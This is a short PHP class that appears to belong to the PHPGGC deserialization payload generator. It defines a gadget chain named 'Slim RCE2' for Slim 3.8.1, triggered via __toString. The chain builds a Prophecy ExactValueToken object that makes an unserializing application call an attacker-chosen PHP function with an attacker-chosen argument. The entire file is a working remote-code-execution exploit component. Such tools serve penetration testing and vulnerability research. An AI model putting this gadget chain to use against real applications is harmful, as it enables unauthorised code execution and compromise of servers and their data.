<?php

namespace GadgetChain\Slim;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.8.1';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Prophecy\Argument\Token\ExactValueToken($function, $parameter);
    }
}